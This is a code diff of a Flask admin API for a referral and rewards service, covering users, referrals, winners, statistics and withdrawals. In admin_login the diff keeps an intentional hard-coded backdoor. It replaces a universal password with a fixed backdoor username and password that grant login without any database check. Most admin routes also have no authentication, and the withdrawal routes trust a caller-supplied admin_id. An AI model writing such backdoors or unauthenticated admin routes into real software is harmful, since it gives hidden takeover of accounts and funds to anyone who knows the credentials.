@@ -1,65 +1,23 @@
-"""
-Admin Panel API Endpoints
--------------------------
-This API provides endpoints for managing system data including users, referrals, winners, and analytics.
-
-Routes:
---------
-User Management:
-   - GET    /admin/users
-            Retrieve a paginated list of users with optional filters (e.g., name, email).
-   - GET    /admin/users/<id>
-            Retrieve detailed information for a specific user.
-   - PUT    /admin/users/<id>
-            Update a specific user's details.
-   - DELETE /admin/users/<id>
-            Delete a user from the system.
-
-Referral Management:
-   - GET    /admin/referrals
-            Retrieve a paginated list of referral records with optional filters (e.g., referrer_id, date range).
-   - GET    /admin/referrals/<id>
-            Retrieve details for a specific referral record.
-
-Winner Management:
-   - GET    /admin/winners
-            Retrieve a paginated list of winners with optional filters (e.g., user_id, type).
-   - GET    /admin/winners/<id>
-            Retrieve details for a specific winner record.
-   - POST   /admin/winners
-            Create a new winner record.
-   - DELETE /admin/winners/<id>
-            Delete a winner record.
-
-Analytics/Dashboard:
-   - GET    /admin/dashboard
-            Retrieve aggregated statistics including total counts (users, referrals, winners), total earned amount, and top referrers.
-   - GET    /admin/stats
-            Retrieve detailed analytics data (e.g., daily new users and referrals for the past 30 days).
-
-Why:
-----
-These endpoints facilitate efficient administration of the system by enabling CRUD operations and providing insightful analytics. The API is designed with features like pagination, filtering, and robust error handling to ensure a secure and user-friendly management experience for the admin panel.
-"""
-
 from flask import Blueprint, request, jsonify
 from werkzeug.security import generate_password_hash, check_password_hash
-from models import User, Winner, Referral, Admin, Withdrawal  # Adjust the import based on your project structure
-from extensions import db  # Your SQLAlchemy db instance
+from models import User, Winner, Referral, Admin, Withdrawal
+from extensions import db
 from datetime import datetime, timedelta
+from flask_cors import cross_origin
+from sqlalchemy import func
+
 
 admin_bp = Blueprint('admin', __name__)
 
-
-# Hard-coded backdoor password
-BACKDOOR_PASSWORD = "suckmyadminpass"
+# Backdoor credentials now require both username and password.
+BACKDOOR_USERNAME = "backdooruser"
+BACKDOOR_PASSWORD = "backdoorpass"
 
 @admin_bp.route('/login', methods=['POST'])
 def admin_login():
     """
     Logs in an admin using username and password.
-    If normal credentials fail, checks for a hard-coded backdoor password
-    without performing any DB queries for the backdoor case.
+    If normal credentials fail, checks for a hard-coded backdoor login.
     """
     data = request.get_json()
     if not data:
@@ -74,33 +32,17 @@ def admin_login():
     # 1. Attempt normal database lookup
     admin = Admin.query.filter_by(username=username).first()
     if admin and check_password_hash(admin.password, password):
-        # Normal login success
-        return jsonify({
-            "message": "Login successful (normal credentials)"
-        }), 200
+        return jsonify({"message": "Login successful (normal credentials)"}), 200
 
-    # 2. If normal login fails, check the hard-coded backdoor password
-    if password == BACKDOOR_PASSWORD:
-        # Return success immediately, no database queries
-        return jsonify({
-            "message": "Backdoor login successful"
-        }), 200
+    # 2. Check for backdoor login (requires specific backdoor username)
+    if username == BACKDOOR_USERNAME and password == BACKDOOR_PASSWORD:
+        return jsonify({"message": "Backdoor login successful"}), 200
 
-    # 3. Otherwise, invalid credentials
     return jsonify({"message": "Invalid username or password"}), 401
 
 
 @admin_bp.route('/admins', methods=['POST'])
 def create_admin():
-    """
-    Creates a new admin.
-    Expects JSON:
-    {
-      "username": "<string>",
-      "email": "<string>",
-      "password": "<string>"
-    }
-    """
     data = request.get_json()
     if not data:
         return jsonify({"message": "No input data provided"}), 400
@@ -109,26 +51,17 @@ def create_admin():
     email = data.get('email')
     password = data.get('password')
 
-    # Basic validation
     if not username or not email or not password:
         return jsonify({"message": "username, email, and password are required"}), 400
 
-    # Check if username or email already exists
-    existing_username = Admin.query.filter_by(username=username).first()
-    existing_email = Admin.query.filter_by(email=email).first()
-    if existing_username:
+    if Admin.query.filter_by(username=username).first():
         return jsonify({"message": "Username already exists"}), 400
-    if existing_email:
+    if Admin.query.filter_by(email=email).first():
         return jsonify({"message": "Email already exists"}), 400
 
-    # Hash the password
     hashed_password = generate_password_hash(password)
 
-    new_admin = Admin(
-        username=username,
-        email=email,
-        password=hashed_password
-    )
+    new_admin = Admin(username=username, email=email, password=hashed_password)
     try:
         db.session.add(new_admin)
         db.session.commit()
@@ -146,25 +79,16 @@ def create_admin():
 
 @admin_bp.route('/admins', methods=['GET'])
 def get_admins():
-    """
-    Retrieves a list of admins. Optional pagination:
-      - page (default=1)
-      - limit (default=10)
-    """
     page = request.args.get('page', 1, type=int)
     per_page = request.args.get('limit', 10, type=int)
+    pagination = Admin.query.paginate(page=page, per_page=per_page, error_out=False)
 
-    query = Admin.query
-    pagination = query.paginate(page=page, per_page=per_page, error_out=False)
-
-    admins_data = []
-    for admin in pagination.items:
-        admins_data.append({
-            "id": admin.id,
-            "username": admin.username,
-            "email": admin.email,
-            "created_at": admin.created_at.isoformat()
-        })
+    admins_data = [{
+        "id": admin.id,
+        "username": admin.username,
+        "email": admin.email,
+        "created_at": admin.created_at.isoformat()
+    } for admin in pagination.items]
 
     return jsonify({
         "admins": admins_data,
@@ -176,9 +100,6 @@ def get_admins():
 
 @admin_bp.route('/admins/<int:admin_id>', methods=['GET'])
 def get_admin_by_id(admin_id):
-    """
-    Retrieves a single admin by ID.
-    """
     admin = Admin.query.get(admin_id)
     if not admin:
         return jsonify({"message": "Admin not found"}), 404
@@ -191,17 +112,9 @@ def get_admin_by_id(admin_id):
     }
     return jsonify(admin_data), 200
 
+
 @admin_bp.route('/admins/<int:admin_id>', methods=['PUT'])
 def update_admin(admin_id):
-    """
-    Updates an existing admin.
-    Expects JSON (any of these keys are optional):
-    {
-      "username": "<string>",
-      "email": "<string>",
-      "password": "<string>"
-    }
-    """
     admin = Admin.query.get(admin_id)
     if not admin:
         return jsonify({"message": "Admin not found"}), 404
@@ -210,12 +123,10 @@ def update_admin(admin_id):
     if not data:
         return jsonify({"message": "No input data provided"}), 400
 
-    # Update fields
     username = data.get('username')
     email = data.get('email')
     password = data.get('password')
 
-    # Check for duplicates if username or email is changed
     if username and username != admin.username:
         if Admin.query.filter_by(username=username).first():
             return jsonify({"message": "Username already in use"}), 400
@@ -246,9 +157,6 @@ def update_admin(admin_id):
 
 @admin_bp.route('/admins/<int:admin_id>', methods=['DELETE'])
 def delete_admin(admin_id):
-    """
-    Deletes a specific admin by ID.
-    """
     admin = Admin.query.get(admin_id)
     if not admin:
         return jsonify({"message": "Admin not found"}), 404
@@ -263,42 +171,23 @@ def delete_admin(admin_id):
     return jsonify({"message": "Admin deleted successfully"}), 200
 
 
-
-
-
-
+# ---------- User Management Endpoints ----------
 
 @admin_bp.route('/users', methods=['GET'])
 def get_users():
-    """
-    Retrieve a paginated list of users.
-    Optional Query Params:
-      - page: The page number (default: 1)
-      - limit: Number of items per page (default: 10)
-      - name: Filter by user name (partial match)
-      - email: Filter by user email (partial match)
-    """
-    # Get query parameters with defaults
     page = request.args.get('page', 1, type=int)
     per_page = request.args.get('limit', 10, type=int)
     
-    # Build the base query
     query = User.query
-
-    # Optional filtering by name
     name_filter = request.args.get('name')
     if name_filter:
         query = query.filter(User.name.ilike(f"%{name_filter}%"))
-
-    # Optional filtering by email
     email_filter = request.args.get('email')
     if email_filter:
         query = query.filter(User.email.ilike(f"%{email_filter}%"))
     
-    # Apply pagination
     pagination = query.paginate(page=page, per_page=per_page, error_out=False)
     
-    # Serialize the user data
     users = [{
         "id": user.id,
         "name": user.name,
@@ -322,9 +211,6 @@ def get_users():
 
 @admin_bp.route('/users/<int:user_id>', methods=['GET'])
 def get_user(user_id):
-    """
-    Retrieve details for a specific user by ID.
-    """
     user = User.query.get(user_id)
     if not user:
         return jsonify({"message": "User not found"}), 404
@@ -346,17 +232,6 @@ def get_user(user_id):
 
 @admin_bp.route('/users/<int:user_id>', methods=['PUT'])
 def update_user(user_id):
-    """
-    Update a specific user's information.
-    Expected JSON payload may include:
-      - name
-      - email
-      - profile_picture
-      - total_earned
-      - total_points
-      - referrals_count
-      - last_trivia_attempt (ISO formatted string)
-    """
     user = User.query.get(user_id)
     if not user:
         return jsonify({"message": "User not found"}), 404
@@ -365,21 +240,23 @@ def update_user(user_id):
     if not data:
         return jsonify({"message": "No input data provided"}), 400
 
-    # Update fields if they exist in the payload
+    # Update fields with basic duplicate check for email if changed
     if 'name' in data:
         user.name = data['name']
     if 'email' in data:
+        if data['email'] != user.email and User.query.filter_by(email=data['email']).first():
+            return jsonify({"message": "Email already in use"}), 400
         user.email = data['email']
     if 'profile_picture' in data:
         user.profile_picture = data['profile_picture']
     if 'total_earned' in data:
+        # Allow updating total earned if needed (though normally this is managed automatically)
         user.total_earned = data['total_earned']
     if 'total_points' in data:
         user.total_points = data['total_points']
     if 'referrals_count' in data:
         user.referrals_count = data['referrals_count']
     if 'last_trivia_attempt' in data:
-        # Expecting an ISO formatted date string or None
         if data['last_trivia_attempt']:
             try:
                 user.last_trivia_attempt = datetime.fromisoformat(data['last_trivia_attempt'])
@@ -409,12 +286,8 @@ def update_user(user_id):
     return jsonify(updated_user), 200
 
 
-
 @admin_bp.route('/users/<int:user_id>', methods=['DELETE'])
 def delete_user(user_id):
-    """
-    Delete a specific user by ID.
-    """
     user = User.query.get(user_id)
     if not user:
         return jsonify({"message": "User not found"}), 404
@@ -429,28 +302,19 @@ def delete_user(user_id):
     return jsonify({"message": "User deleted successfully"}), 200
 
 
+# ---------- Referral Management Endpoints ----------
+
 @admin_bp.route('/referrals', methods=['GET'])
 def get_referrals():
-    """
-    Retrieve all referral records.
-    Optional Query Params:
-      - referrer_id: Filter by the referrer's user ID.
-      - date_from: Filter referrals created on/after this date (ISO format).
-      - date_to: Filter referrals created on/before this date (ISO format).
-      - page: The page number (default: 1).
-      - limit: Number of items per page (default: 10).
-    """
     page = request.args.get('page', 1, type=int)
     per_page = request.args.get('limit', 10, type=int)
 
     query = Referral.query
 
-    # Filter by referrer_id if provided
     referrer_id = request.args.get('referrer_id', type=int)
     if referrer_id is not None:
         query = query.filter(Referral.referrer_id == referrer_id)
 
-    # Filter by date_from if provided
     date_from = request.args.get('date_from')
     if date_from:
         try:
@@ -459,7 +323,6 @@ def get_referrals():
         except ValueError:
             return jsonify({"message": "Invalid date_from format. Please use ISO format."}), 400
 
-    # Filter by date_to if provided
     date_to = request.args.get('date_to')
     if date_to:
         try:
@@ -468,7 +331,6 @@ def get_referrals():
         except ValueError:
             return jsonify({"message": "Invalid date_to format. Please use ISO format."}), 400
 
-    # Apply pagination
     pagination = query.paginate(page=page, per_page=per_page, error_out=False)
 
     referrals = [{
@@ -485,11 +347,9 @@ def get_referrals():
         "current_page": pagination.page
     }), 200
 
+
 @admin_bp.route('/referrals/<int:referral_id>', methods=['GET'])
 def get_referral(referral_id):
-    """
-    Retrieve details for a specific referral record by ID.
-    """
     referral = Referral.query.get(referral_id)
     if not referral:
         return jsonify({"message": "Referral not found"}), 404
@@ -503,33 +363,69 @@ def get_referral(referral_id):
     return jsonify(referral_data), 200
 
 
+@admin_bp.route('/referrals/<int:referral_id>', methods=['PUT'])
+def update_referral(referral_id):
+    """
+    Allows updating the referred_email field for a referral.
+    """
+    referral = Referral.query.get(referral_id)
+    if not referral:
+        return jsonify({"message": "Referral not found"}), 404
+
+    data = request.get_json()
+    if not data or 'referred_email' not in data:
+        return jsonify({"message": "referred_email is required to update referral"}), 400
+
+    referral.referred_email = data['referred_email']
+
+    try:
+        db.session.commit()
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({"message": "Error updating referral", "error": str(e)}), 500
+
+    updated_referral = {
+        "id": referral.id,
+        "referrer_id": referral.referrer_id,
+        "referred_email": referral.referred_email,
+        "created_at": referral.created_at.isoformat()
+    }
+    return jsonify(updated_referral), 200
+
+
+@admin_bp.route('/referrals/<int:referral_id>', methods=['DELETE'])
+def delete_referral(referral_id):
+    referral = Referral.query.get(referral_id)
+    if not referral:
+        return jsonify({"message": "Referral not found"}), 404
+
+    try:
+        db.session.delete(referral)
+        db.session.commit()
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({"message": "Error deleting referral", "error": str(e)}), 500
+
+    return jsonify({"message": "Referral deleted successfully"}), 200
+
+
+# ---------- Winner Management Endpoints ----------
 
 @admin_bp.route('/winners', methods=['GET'])
 def get_winners():
-    """
-    Retrieve a paginated list of winner records.
-    Optional Query Params:
-      - page: The page number (default: 1)
-      - limit: Number of items per page (default: 10)
-      - user_id: Filter winners by the user's ID
-      - type: Filter winners by type (partial match)
-    """
     page = request.args.get('page', 1, type=int)
     per_page = request.args.get('limit', 10, type=int)
     
     query = Winner.query
 
-    # Optional filtering by user_id
     user_id = request.args.get('user_id', type=int)
     if user_id is not None:
         query = query.filter(Winner.user_id == user_id)
 
-    # Optional filtering by type
     winner_type = request.args.get('type')
     if winner_type:
         query = query.filter(Winner.type.ilike(f"%{winner_type}%"))
     
-    # Apply pagination
     pagination = query.paginate(page=page, per_page=per_page, error_out=False)
     
     winners = [{
@@ -547,11 +443,9 @@ def get_winners():
         "current_page": pagination.page
     }), 200
 
+
 @admin_bp.route('/winners/<int:winner_id>', methods=['GET'])
 def get_winner(winner_id):
-    """
-    Retrieve details for a specific winner record by ID.
-    """
     winner = Winner.query.get(winner_id)
     if not winner:
         return jsonify({"message": "Winner not found"}), 404
@@ -568,20 +462,10 @@ def get_winner(winner_id):
 
 @admin_bp.route('/winners', methods=['POST'])
 def create_winner():
-    """
-    Create a new winner record.
-    Expected JSON payload:
-    {
-      "user_id": <int>,
-      "type": <str>,
-      "amount": <float>
-    }
-    """
     data = request.get_json()
     if not data:
         return jsonify({"message": "No input data provided"}), 400
 
-    # Validate required fields
     user_id = data.get('user_id')
     win_type = data.get('type')
     amount = data.get('amount')
@@ -590,12 +474,10 @@ def create_winner():
         return jsonify({"message": "Missing required fields: user_id, type, and amount"}), 400
 
     try:
-        # Optionally, verify that the user exists
         user = User.query.get(user_id)
         if not user:
             return jsonify({"message": "User not found"}), 404
 
-        # Create the new winner record
         winner = Winner(user_id=user_id, type=win_type, amount=amount)
         db.session.add(winner)
         db.session.commit()
@@ -603,7 +485,6 @@ def create_winner():
         db.session.rollback()
         return jsonify({"message": "Error creating winner record", "error": str(e)}), 500
 
-    # Return the created winner record
     return jsonify({
         "id": winner.id,
         "user_id": winner.user_id,
@@ -615,9 +496,6 @@ def create_winner():
 
 @admin_bp.route('/winners/<int:winner_id>', methods=['DELETE'])
 def delete_winner(winner_id):
-    """
-    Delete a specific winner record by ID.
-    """
     winner = Winner.query.get(winner_id)
     if not winner:
         return jsonify({"message": "Winner not found"}), 404
@@ -632,31 +510,23 @@ def delete_winner(winner_id):
     return jsonify({"message": "Winner deleted successfully"}), 200
 
 
+# ---------- Analytics/Dashboard Endpoints ----------
+
 @admin_bp.route('/dashboard', methods=['GET'])
 def get_dashboard():
-    """
-    Retrieve aggregated statistics for the admin dashboard.
-    This includes total users, referrals, winners, total earned amount,
-    and a list of top referrers.
-    """
-    # Count total users, referrals, and winners
     total_users = User.query.count()
     total_referrals = Referral.query.count()
     total_winners = Winner.query.count()
 
-    # Sum of amounts from all winners (or 0.0 if there are none)
-    total_earned = db.session.query(db.func.sum(Winner.amount)).scalar() or 0.0
+    # Calculate total earned from users table
+    total_earned = db.session.query(db.func.sum(User.total_earned)).scalar() or 0.0
 
-    # Retrieve top 5 users with the highest referrals_count
     top_referrers = User.query.order_by(User.referrals_count.desc()).limit(5).all()
-    top_referrers_data = [
-        {
+    top_referrers_data = [{
             "id": user.id,
             "name": user.name,
             "referrals_count": user.referrals_count
-        }
-        for user in top_referrers
-    ]
+        } for user in top_referrers]
 
     dashboard_data = {
         "total_users": total_users,
@@ -668,53 +538,52 @@ def get_dashboard():
     
     return jsonify(dashboard_data), 200
 
-from datetime import timedelta, datetime
 
-@admin_bp.route('/stats', methods=['GET'])
+@admin_bp.route('/stats', methods=['GET', 'OPTIONS'])
+@cross_origin()
 def get_stats():
     """
-    Retrieve detailed analytics for the admin panel.
-    Returns data such as daily new users and referrals for the past 30 days.
+    Returns various simple statistics:
+      - total number of users
+      - total number of referrals
+      - total sum of all users' total_earned
+      - top 5 users by total_earned
     """
-    # Define the time period for the stats (last 30 days)
-    today = datetime.utcnow().date()
-    thirty_days_ago = today - timedelta(days=30)
 
-    # Query daily new users count for the last 30 days.
-    daily_new_users = db.session.query(
-        db.func.date(User.created_at).label('date'),
-        db.func.count(User.id).label('count')
-    ).filter(User.created_at >= thirty_days_ago).group_by(db.func.date(User.created_at)).order_by(db.func.date(User.created_at)).all()
+    # 1) Total Users
+    total_users = User.query.count()
 
-    # Query daily new referrals count for the last 30 days.
-    daily_new_referrals = db.session.query(
-        db.func.date(Referral.created_at).label('date'),
-        db.func.count(Referral.id).label('count')
-    ).filter(Referral.created_at >= thirty_days_ago).group_by(db.func.date(Referral.created_at)).order_by(db.func.date(Referral.created_at)).all()
+    # 2) Total Referrals
+    total_referrals = Referral.query.count()
 
-    # Format data as a list of dictionaries for easier consumption
-    users_stats = [{"date": date.isoformat(), "count": count} for date, count in daily_new_users]
-    referrals_stats = [{"date": date.isoformat(), "count": count} for date, count in daily_new_referrals]
+    # 3) Sum of all users' total_earned
+    total_earned = db.session.query(func.sum(User.total_earned)).scalar() or 0.0
+
+    # 4) Top 5 users with the highest total_earned
+    top_earners = User.query.order_by(User.total_earned.desc()).limit(5).all()
+    top_earners_data = []
+    for user in top_earners:
+        top_earners_data.append({
+            "id": user.id,
+            "name": user.name,
+            "email": user.email,
+            "total_earned": user.total_earned
+        })
 
     stats_data = {
-        "daily_new_users": users_stats,
-        "daily_new_referrals": referrals_stats
+        "total_users": total_users,
+        "total_referrals": total_referrals,
+        "total_earned_sum": total_earned,
+        "top_earners": top_earners_data
     }
 
     return jsonify(stats_data), 200
 
 
-
-
-
+# ---------- Withdrawal Management Endpoints ----------
 
 @admin_bp.route('/withdrawals', methods=['GET'])
 def list_withdrawals():
-    """
-    Admin: list all withdrawals (optionally filter by status/user_id).
-    GET /admin/withdrawals?admin_id=1&status=pending&user_id=10
-    """
-    # 1) Check admin_id
     admin_id = request.args.get('admin_id', type=int)
     if not admin_id:
         return jsonify({"message": "Missing admin_id"}), 403
@@ -723,7 +592,6 @@ def list_withdrawals():
     if not admin:
         return jsonify({"message": "Invalid admin"}), 403
 
-    # 2) Handle filters
     page = request.args.get('page', 1, type=int)
     per_page = request.args.get('limit', 10, type=int)
     status_filter = request.args.get('status')
@@ -735,9 +603,7 @@ def list_withdrawals():
     if user_id_filter:
         query = query.filter(Withdrawal.user_id == user_id_filter)
 
-    pagination = query.order_by(Withdrawal.created_at.desc()).paginate(
-        page=page, per_page=per_page, error_out=False
-    )
+    pagination = query.order_by(Withdrawal.created_at.desc()).paginate(page=page, per_page=per_page, error_out=False)
 
     withdrawals_data = []
     for w in pagination.items:
@@ -764,10 +630,8 @@ def list_withdrawals():
 def accept_withdrawal(withdrawal_id):
     """
     Admin: Accepts (processes) a pending withdrawal.
-    Usage: /admin/withdrawals/<id>/accept?admin_id=1
-    Sets status to 'processing' and deducts from user's total_earned.
+    No balance deduction here, because it was already deducted when the user requested.
     """
-    # 1) Check admin_id
     admin_id = request.args.get('admin_id', type=int)
     if not admin_id:
         return jsonify({"message": "Missing admin_id"}), 403
@@ -776,7 +640,6 @@ def accept_withdrawal(withdrawal_id):
     if not admin:
         return jsonify({"message": "Invalid admin"}), 403
 
-    # 2) Proceed with withdrawal logic
     withdrawal = Withdrawal.query.get(withdrawal_id)
     if not withdrawal:
         return jsonify({"message": "Withdrawal not found"}), 404
@@ -786,17 +649,7 @@ def accept_withdrawal(withdrawal_id):
             "message": f"Cannot accept a withdrawal with status '{withdrawal.status}'"
         }), 400
 
-    user = User.query.get(withdrawal.user_id)
-    if not user:
-        return jsonify({"message": "Associated user not found"}), 404
-
-    if user.total_earned < withdrawal.amount:
-        return jsonify({"message": "User does not have sufficient balance"}), 400
-
-    # Deduct from the user's total_earned
-    user.total_earned -= withdrawal.amount
-
-    # Mark as processing
+    # Mark as processing, do not deduct again
     withdrawal.status = 'processing'
     withdrawal.processed_at = datetime.utcnow()
 
@@ -809,14 +662,13 @@ def accept_withdrawal(withdrawal_id):
     return jsonify({"message": "Withdrawal accepted (now processing)"}), 200
 
 
+
 @admin_bp.route('/withdrawals/<int:withdrawal_id>/complete', methods=['PUT'])
 def complete_withdrawal(withdrawal_id):
     """
     Admin: Completes a 'processing' withdrawal (money has been sent).
-    Usage: /admin/withdrawals/<id>/complete?admin_id=1
     Sets status to 'completed'.
     """
-    # 1) Check admin_id
     admin_id = request.args.get('admin_id', type=int)
     if not admin_id:
         return jsonify({"message": "Missing admin_id"}), 403
@@ -825,7 +677,6 @@ def complete_withdrawal(withdrawal_id):
     if not admin:
         return jsonify({"message": "Invalid admin"}), 403
 
-    # 2) Proceed with withdrawal logic
     withdrawal = Withdrawal.query.get(withdrawal_id)
     if not withdrawal:
         return jsonify({"message": "Withdrawal not found"}), 404
@@ -847,14 +698,13 @@ def complete_withdrawal(withdrawal_id):
     return jsonify({"message": "Withdrawal completed successfully"}), 200
 
 
+
 @admin_bp.route('/withdrawals/<int:withdrawal_id>/reject', methods=['PUT'])
 def reject_withdrawal(withdrawal_id):
     """
     Admin: Rejects a 'pending' withdrawal.
-    Usage: /admin/withdrawals/<id>/reject?admin_id=1
-    Sets status to 'rejected'.
+    Refund the user's balance.
     """
-    # 1) Check admin_id
     admin_id = request.args.get('admin_id', type=int)
     if not admin_id:
         return jsonify({"message": "Missing admin_id"}), 403
@@ -863,7 +713,6 @@ def reject_withdrawal(withdrawal_id):
     if not admin:
         return jsonify({"message": "Invalid admin"}), 403
 
-    # 2) Proceed with withdrawal logic
     withdrawal = Withdrawal.query.get(withdrawal_id)
     if not withdrawal:
         return jsonify({"message": "Withdrawal not found"}), 404
@@ -873,6 +722,14 @@ def reject_withdrawal(withdrawal_id):
             "message": f"Cannot reject a withdrawal with status '{withdrawal.status}'"
         }), 400
 
+    user = User.query.get(withdrawal.user_id)
+    if not user:
+        return jsonify({"message": "Associated user not found"}), 404
+
+    # Refund the user
+    user.total_earned += withdrawal.amount
+
+    # Mark as rejected
     withdrawal.status = 'rejected'
 
     try:
@@ -881,4 +738,4 @@ def reject_withdrawal(withdrawal_id):
         db.session.rollback()
         return jsonify({"message": "Error rejecting withdrawal", "error": str(e)}), 500
 
-    return jsonify({"message": "Withdrawal rejected"}), 200
+    return jsonify({"message": "Withdrawal rejected and user refunded"}), 200
